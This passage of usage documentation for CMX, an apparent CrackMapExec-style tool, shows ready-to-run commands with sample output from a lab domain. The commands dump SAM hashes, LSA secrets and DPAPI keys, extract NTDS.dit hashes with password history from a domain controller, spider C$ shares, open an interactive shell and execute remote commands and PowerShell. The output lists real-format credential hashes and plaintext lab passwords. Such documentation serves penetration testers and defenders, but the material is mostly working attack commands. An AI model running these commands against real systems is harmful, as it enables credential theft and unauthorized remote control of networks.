Aug.20.19 15:55:30         [!] Saved 3 hashes to ~/.cmx/logs/WIN7P-PC_10.10.33.124_2019-08-20_155530.sam [!]
Aug.20.19 15:55:30  Win7E:1000:aad3b435b51404eeaad3b435b51404ee:7ef966657ac6efcd0692cef758f4deb9:::
Aug.20.19 15:55:30         [!] Added 3 SAM hashes to the database [!]
Aug.20.19 15:55:30         [!] Saved 3 hashes to ~/.cmx/logs/WIN7E-PC_10.10.33.123_2019-08-20_155530.sam [!]
```

------------------------------------------------------------------------
### \*Dump LSA secrets using methods from secretsdump.py 

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | true        | false       | true*      |

```
#~ cmx smb 10.10.33.123 -u agrande -p User\!23 --lsa

Aug.20.19 15:53:43  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 15:53:43  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 15:53:43         [!] Dumping LSA Secrets [!]
Aug.20.19 15:53:45  OCEAN.DEPTH/agrande:$DCC2$10240#agrande#6ee787a8c20b17e48fde84e8af8d1674
Aug.20.19 15:53:45  OCEAN.DEPTH/ozzy:$DCC2$10240#ozzy#c2d829b4ae6ca6dba48ea7fa9986ee19
Aug.20.19 15:53:46  OCEAN\WIN7E-PC$:aes256-cts-hmac-sha1-96:d7b6c0a0913d3c1b155d5cb1cede486611539bf320a459a32c63116598c9b7b0
Aug.20.19 15:53:46  OCEAN\WIN7E-PC$:aes128-cts-hmac-sha1-96:2a085aa1630ce804a0d78c9cddd55bc2
Aug.20.19 15:53:46  OCEAN\WIN7E-PC$:des-cbc-md5:d368c1c20898f44f
Aug.20.19 15:53:46  OCEAN\WIN7E-PC$:aad3b435b51404eeaad3b435b51404ee:2d3b04ef5f2dee295d2ba35ab55e2147:::
Aug.20.19 15:53:46  dpapi_machinekey:0xd61ff0e849d40a2705d6d2da6dd26bddfa830ef5
dpapi_userkey:0xa142738f797c7b20b096fddfef2eeff0dce96da6
Aug.20.19 15:53:46  NL$KM:e8b744812f400fb5041390eb16f23eeb8448799fac5d1802d618a96f4051b00db12202e6eb586f97e0c561df6477e4e6312ec55070ac4a7807a47b98fb3db947
Aug.20.19 15:53:46         [!] Saved 8 LSA secrets to /root/.cmx/logs/WIN7E-PC_10.10.33.123_2019-08-20_155343.secrets [!]
```

------------------------------------------------------------------------
### \*\*\*Dump the NTDS.dit from target DC using methods from secretsdump.py   

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| false         | false       | true        | false       | true*      |

The TARGET must be a domain controller.  
  
2 methods are available: 

drsuapi   (default)   
Uses drsuapi RPC interface create a handle, trigger replication, and combined with     
additional drsuapi calls to convert the resultant linked-lists into readable format  

vss - Uses the Volume Shadow copy Service    

```
#~ cmx smb 10.10.33.100 -u Administrator -p AdminSuper\!23 --ntds vss
#~ cmx smb 10.10.33.100 -u Administrator -p AdminSuper\!23 --ntds
```
Example Run:
```
#~ cmx smb 10.10.33.100 -u Administrator -p AdminSuper\!23 --ntds

Aug.20.19 15:56:43  SMB         10.10.33.100:445  10.10.33.100 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:True) (SMBv:1)             
Aug.20.19 15:56:43  SMB         10.10.33.100:445  10.10.33.100 [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)                                                    
Aug.20.19 15:56:44  SMB         10.10.33.100:445  10.10.33.100 [+] Dumping the NTDS, this could take a while so go grab a redbull...                             |
Aug.20.19 15:56:44  SMB         10.10.33.100:445  10.10.33.100 Administrator:500:aad3b435b51404eeaad3b435b51404ee:aef8db238cf09c4744b7b2a26277189b:::            
Aug.20.19 15:56:44  SMB         10.10.33.100:445  10.10.33.100 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                    
Aug.20.19 15:56:44  SMB         10.10.33.100:445  10.10.33.100 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:196ced39f728b80790127de587b8d8ee:::                   
Aug.20.19 15:56:45  SMB         10.10.33.100:445  10.10.33.100 ocean.depth\agrande:1104:aad3b435b51404eeaad3b435b51404ee:bbc2bf2fbca9dd9ed74d3c1b55e3d727:::     
Aug.20.19 15:56:45  SMB         10.10.33.100:445  10.10.33.100 testuser:1121:aad3b435b51404eeaad3b435b51404ee:86673aaff536236dd926c9af42642044:::                
Aug.20.19 15:56:45  SMB         10.10.33.100:445  10.10.33.100 ringo:1122:aad3b435b51404eeaad3b435b51404ee:bbc2bf2fbca9dd9ed74d3c1b55e3d727:::                   
Aug.20.19 15:56:45  SMB         10.10.33.100:445  10.10.33.100 FdBChukYpb:1123:aad3b435b51404eeaad3b435b51404ee:1074d4d3b4de771fa1220899072fe02d:::              
Aug.20.19 15:56:45  SMB         10.10.33.100:445  10.10.33.100 ocean.depth\tswift:1126:aad3b435b51404eeaad3b435b51404ee:bbc2bf2fbca9dd9ed74d3c1b55e3d727:::      
Aug.20.19 15:56:45  SMB         10.10.33.100:445  10.10.33.100 DC2012-A$:1001:aad3b435b51404eeaad3b435b51404ee:40370f29863afcaa7598ca0b2475f942:::               
Aug.20.19 15:56:45  SMB         10.10.33.100:445  10.10.33.100 WIN7E-PC$:1105:aad3b435b51404eeaad3b435b51404ee:2d3b04ef5f2dee295d2ba35ab55e2147:::

```

------------------------------------------------------------------------
### \*\*\*Dump the NTDS.dit password history from target DC using methods from secretsdump.py   
You can also grab the history by adding the ntds-history switch after ntds.   
The output contains the hash(es) and user_history hash(es) of the previous passwords.  
History hashes are noted with a number to tell you how far back the password was used.  

You need to use both ntds and the ntds-history switch together.  
```
#~ cmx smb 10.10.33.100 -u Administrator -p AdminSuper\!23 --ntds --ntds-history

Aug.20.19 16:00:00  SMB         10.10.33.100:445  10.10.33.100 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:True) (SMBv:1)
Aug.20.19 16:00:00  SMB         10.10.33.100:445  10.10.33.100 [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
Aug.20.19 16:00:00  SMB         10.10.33.100:445  10.10.33.100 [+] Dumping the NTDS, this could take a while so go grab a redbull...
Aug.20.19 16:00:00  SMB         10.10.33.100:445  10.10.33.100 Administrator:500:aad3b435b51404eeaad3b435b51404ee:aef8db238cf09c4744b7b2a26277189b:::
Aug.20.19 16:00:00  SMB         10.10.33.100:445  10.10.33.100 Administrator_history0:500:aad3b435b51404eeaad3b435b51404ee:1c493696a7a1771b071080bf8cbc68c6:::
Aug.20.19 16:00:00  SMB         10.10.33.100:445  10.10.33.100 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Aug.20.19 16:00:00  SMB         10.10.33.100:445  10.10.33.100 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:196ced39f728b80790127de587b8d8ee:::
Aug.20.19 16:00:01  SMB         10.10.33.100:445  10.10.33.100 DC2012-A$:1001:aad3b435b51404eeaad3b435b51404ee:40370f29863afcaa7598ca0b2475f942:::
Aug.20.19 16:00:01  SMB         10.10.33.100:445  10.10.33.100 DC2012-A$_history0:1001:aad3b435b51404eeaad3b435b51404ee:17738b00d494f35643af0808e507e236:::
Aug.20.19 16:00:01  SMB         10.10.33.100:445  10.10.33.100 DC2012-A$_history1:1001:aad3b435b51404eeaad3b435b51404ee:e5fb417d2e99a11af210451cbb804f1d:::
Aug.20.19 16:00:01  SMB         10.10.33.100:445  10.10.33.100 DC2012-A$_history2:1001:aad3b435b51404eeaad3b435b51404ee:a16a596a99d5ee38ba2f33ee85fab318:::
Aug.20.19 16:00:01  SMB         10.10.33.100:445  10.10.33.100 DC2012-A$_history3:1001:aad3b435b51404eeaad3b435b51404ee:b76ca93715f34c0020e7246d715fed64:::
Aug.20.19 16:00:01  SMB         10.10.33.100:445  10.10.33.100 DC2012-A$_history4:1001:aad3b435b51404eeaad3b435b51404ee:7cb7bcaf56e331d91081de73b88e3c6f:::
Aug.20.19 16:00:01  SMB         10.10.33.100:445  10.10.33.100 DC2012-A$_history5:1001:aad3b435b51404eeaad3b435b51404ee:dca9c242481691b6227a78aa8be3ed1e:::
```

------------------------------------------------------------------------
### \*\*\*Show the pwdLastSet attribute for each NTDS.dit account  
Password last set info is appended after the hash.   
```
#~ cmx smb 10.10.33.100 -u Administrator -p AdminSuper\!23 --ntds --ntds-pwdLastSet

Aug.20.19 16:01:47  SMB         10.10.33.100:445  10.10.33.100 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:True) (SMBv:1)
Aug.20.19 16:01:48  SMB         10.10.33.100:445  10.10.33.100 [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
Aug.20.19 16:01:48  SMB         10.10.33.100:445  10.10.33.100 [+] Dumping the NTDS, this could take a while so go grab a redbull...
Aug.20.19 16:01:48  SMB         10.10.33.100:445  10.10.33.100 Administrator:500:aad3b435b51404eeaad3b435b51404ee:aef8db238cf09c4744b7b2a26277189b::: (pwdLastSet
=2019-06-12 09:56)
Aug.20.19 16:01:48  SMB         10.10.33.100:445  10.10.33.100 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (pwdLastSet=never)
Aug.20.19 16:01:48  SMB         10.10.33.100:445  10.10.33.100 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:196ced39f728b80790127de587b8d8ee::: (pwdLastSet=2019-0
1-17 15:11)
Aug.20.19 16:01:48  SMB         10.10.33.100:445  10.10.33.100 ocean.depth\agrande:1104:aad3b435b51404eeaad3b435b51404ee:bbc2bf2fbca9dd9ed74d3c1b55e3d727::: (pwd
LastSet=2019-01-18 10:58)
Aug.20.19 16:01:48  SMB         10.10.33.100:445  10.10.33.100 ocean.depth\ozzy:1111:aad3b435b51404eeaad3b435b51404ee:9ae52054b53d771c62414f93ed0a2599::: (pwdLas
tSet=2019-01-25 13:46)
Aug.20.19 16:01:48  SMB         10.10.33.100:445  10.10.33.100 testuser:1121:aad3b435b51404eeaad3b435b51404ee:86673aaff536236dd926c9af42642044::: (pwdLastSet=201
9-02-07 13:04)
```

------------------------------------------------------------------------
### Show the account status for each NTDS.dit account  
Enabled or disabled.   
```
#~ cmx smb 10.10.33.100 -u Administrator -p AdminSuper\!23 --ntds --ntds-status

Aug.20.19 17:37:19  SMB         10.10.33.100:445  10.10.33.100 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:True) (SMBv:1)
Aug.20.19 17:37:19  SMB         10.10.33.100:445  10.10.33.100 [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
Aug.20.19 17:37:20  SMB         10.10.33.100:445  10.10.33.100 [+] Dumping the NTDS, this could take a while so go grab a redbull...
Aug.20.19 17:37:20  SMB         10.10.33.100:445  10.10.33.100 Administrator:500:aad3b435b51404eeaad3b435b51404ee:aef8db238cf09c4744b7b2a26277189b::: (status=Enabled)
Aug.20.19 17:37:20  SMB         10.10.33.100:445  10.10.33.100 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Disabled)
Aug.20.19 17:37:20  SMB         10.10.33.100:445  10.10.33.100 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:196ced39f728b80790127de587b8d8ee::: (status=Disabled)
Aug.20.19 17:37:20  SMB         10.10.33.100:445  10.10.33.100 ocean.depth\agrande:1104:aad3b435b51404eeaad3b435b51404ee:bbc2bf2fbca9dd9ed74d3c1b55e3d727::: (status=Enabled)
Aug.20.19 17:37:20  SMB         10.10.33.100:445  10.10.33.100 ocean.depth\ozzy:1111:aad3b435b51404eeaad3b435b51404ee:9ae52054b53d771c62414f93ed0a2599::: (status=Enabled)
Aug.20.19 17:37:20  SMB         10.10.33.100:445  10.10.33.100 testuser:1121:aad3b435b51404eeaad3b435b51404ee:86673aaff536236dd926c9af42642044::: (status=Enabled)
Aug.20.19 17:37:20  SMB         10.10.33.100:445  10.10.33.100 ringo:1122:aad3b435b51404eeaad3b435b51404ee:bbc2bf2fbca9dd9ed74d3c1b55e3d727::: (status=Enabled)
Aug.20.19 17:37:20  SMB         10.10.33.100:445  10.10.33.100 FdBChukYpb:1123:aad3b435b51404eeaad3b435b51404ee:1074d4d3b4de771fa1220899072fe02d::: (status=Enabled)
```


--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
# Spidering Shares

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

Options for spidering shares of remote systems.

## \*\*\*Spider the C drive for files with txt in the name (finds both sometxtfile.html and somefile.txt)
Notice the '$' character has to be escaped. 
Example:  
```
#~ cmx smb 10.10.33.123 -u agrande -p User\!23 --spider C\$ --pattern txt

Aug.20.19 16:06:16  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 16:06:16  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 16:06:16         [!] Starting Spider [!]
Aug.20.19 16:06:16  SMB         10.10.33.123:445  10.10.33.123 [*] Started spidering
Aug.20.19 16:06:16  SMB         10.10.33.123:445  10.10.33.123 [*] Spidering .
Aug.20.19 16:06:18  SMB         10.10.33.123:445  10.10.33.123 //10.10.33.123/C$/Program Files/DVD Maker/Shared/DvdStyles/Pets/Pets_notes-txt-background.png [lastm:'2019-01-17 13:57' size:7888]
Aug.20.19 16:06:18  SMB         10.10.33.123:445  10.10.33.123 //10.10.33.123/C$/Program Files/VMware/VMware Tools/open_source_licenses.txt [lastm:'2019-01-17 12:34' size:607486]
Aug.20.19 16:06:18  SMB         10.10.33.123:445  10.10.33.123 //10.10.33.123/C$/Program Files/VMware/VMware Tools/vmacthlp.txt [lastm:'2019-01-17 12:34' size:233]
Aug.20.19 16:06:18  SMB         10.10.33.123:445  10.10.33.123 //10.10.33.123/C$/Program Files/Windows NT/TableTextService/TableTextServiceAmharic.txt [lastm:'2019-01-17 13:57' size:16212]
Aug.20.19 16:06:18  SMB         10.10.33.123:445  10.10.33.123 //10.10.33.123/C$/Program Files/Windows NT/TableTextService/TableTextServiceArray.txt [lastm:'2019-01-17 13:57' size:1272822]
```


--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
# Interactive Shell Mode

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| false         | false       | true        | false       | true*      |

Gain a command prompt on the target.  

## Interactive Mode
User/Password
```
#~ cmx smb 10.10.33.123 -u agrande -p User\!23 -i
Aug.20.19 14:31:31  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 14:31:31  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 14:31:31         [!] Bout to get shellular [!]
   .... i'm in 

C:\Windows\system32> hostname
Win7E-PC

C:\Windows\system32>

```
  

--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
# WMI Query Execution

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

See more about wmi queries and syntax here: https://docs.microsoft.com/en-us/windows/desktop/wmisdk/invoking-a-synchronous-query

## Issues the specified WMI query
User/Password
```
#~ cmx smb 10.10.33.124 -u agrande -p User\!23 --wmi "SELECT * FROM Win32_logicalDisk WHERE DeviceID = 'C:'"

Aug.20.19 16:20:11  SMB         10.10.33.124:445  10.10.33.124 [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 16:20:11  SMB         10.10.33.124:445  10.10.33.124 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 16:20:11         [!] Executing query:"None" over wmi... [!]
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 Caption => C:
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 Description => Local Fixed Disk
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 InstallDate => 0
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 Name => C:
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 Status => 0
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 Availability => 0
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 CreationClassName => Win32_LogicalDisk
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 ConfigManagerErrorCode => 0
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 ConfigManagerUserConfig => 0
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 DeviceID => C:
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 PowerManagementCapabilities => 0
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 PNPDeviceID => 0
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 PowerManagementSupported => 0
Aug.20.19 16:20:12  SMB         10.10.33.124:445  10.10.33.124 StatusInfo => 0
...
trimmed
...

```


--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
# Command Execution

###### Not all currently working. Mileage may vary depending on exec-method and target OS

Options for executing custom or built-in commands.  


### Execution Methods

CMX has four different command execution methods:
  
- ```wmiexec``` executes commands via WMI
- ```atexec``` executes commands by scheduling a task with windows task scheduler
- ```smbexec``` executes commands by creating and running a service
- ```mmcexec``` similar approach to wmiexec but executing commands through MMC  
   
Details on the execution methods and thier respective advantages can be found  
in the opening comment description of the exec files. /cmx/modules/smb/[name]exec.py  
  
By default CMX will fail over to a different execution method if one fails. It attempts to execute commands in the following order:  

1. ```wmiexec```
2. ```mmcexec```
3. ```atexec```
4. ```smbexec```

If you want to force CMX to use only one execution method you can specify which one using the ```--exec-method``` flag.  
The command execution method is denoted in the Executed Command output line.  
WMIEXEC example, note the 'Executed command via wmiexec' output line.  
```
~# cmx smb 10.10.33.124 -u agrande -p User\!23 -x 'whoami' --exec-method smbexec
Aug.20.19 16:12:57  SMB         10.10.33.124:445  10.10.33.124 [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 16:12:57  SMB         10.10.33.124:445  10.10.33.124 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 16:12:57  SMB         10.10.33.124:445  10.10.33.124 [*] Executing Command
Aug.20.19 16:12:57  SMB         10.10.33.124:445  10.10.33.124 [+] Execution Completed.
Aug.20.19 16:12:57  SMB         10.10.33.124:445  10.10.33.124 [+] Results:
Aug.20.19 16:12:57  SMB         10.10.33.124:445  10.10.33.124     nt authority\system

```

  
### Executing Commands
  
In the following example, we try to execute ```whoami``` on the target using the ```-x``` flag:  
```
#~ cmx smb 10.10.33.124 -u agrande -p User\!23 -x 'whoami' --exec-method smbexec
Aug.20.19 16:12:57  SMB         10.10.33.124:445  10.10.33.124 [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 16:12:57  SMB         10.10.33.124:445  10.10.33.124 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 16:12:57  SMB         10.10.33.124:445  10.10.33.124 [*] Executing Command
Aug.20.19 16:12:57  SMB         10.10.33.124:445  10.10.33.124 [+] Execution Completed.
Aug.20.19 16:12:57  SMB         10.10.33.124:445  10.10.33.124 [+] Results:
Aug.20.19 16:12:57  SMB         10.10.33.124:445  10.10.33.124     nt authority\system
```


------------------------------------------------------------------------
------------------------------------------------------------------------
**Current doc only finished to here. 8/20**

## Executing Powershell Commands
You can also directly execute PowerShell commands using the ```-X``` flag:
```
#~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
SMB         192.168.10.11    445    WIN7BOX          [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:WIN7BOX) (domain:LAB) (signing:False) (SMBv1:True)
SMB         192.168.10.11    445    WIN7BOX          [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.10.11    445    WIN7BOX          [+] Executed command
SMB         192.168.10.11    445    WIN7BOX          Name                           Value
SMB         192.168.10.11    445    WIN7BOX          ----                           -----
SMB         192.168.10.11    445    WIN7BOX          CLRVersion                     2.0.50727.8793
SMB         192.168.10.11    445    WIN7BOX          BuildVersion                   6.1.7601.17514
SMB         192.168.10.11    445    WIN7BOX          PSVersion                      2.0
SMB         192.168.10.11    445    WIN7BOX          WSManStackVersion              2.0
SMB         192.168.10.11    445    WIN7BOX          PSCompatibleVersions           {1.0, 2.0}
SMB         192.168.10.11    445    WIN7BOX          SerializationVersion           1.1.0.1
SMB         192.168.10.11    445    WIN7BOX          PSRemotingProtocolVersion      2.1
```

Powershell commands can be forced to run in a 32bit process:
```
#~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '[System.Environment]::Is64BitProcess' --force-ps32
SMB         192.168.10.11    445    WIN7BOX          [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:WIN7BOX) (domain:LAB) (signing:False) (SMBv1:True)
SMB         192.168.10.11    445    WIN7BOX          [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.10.11    445    WIN7BOX          [+] Executed command
SMB         192.168.10.11    445    WIN7BOX          false
```

Other switches include:
```
--no-output       Does not retrieve command results
```
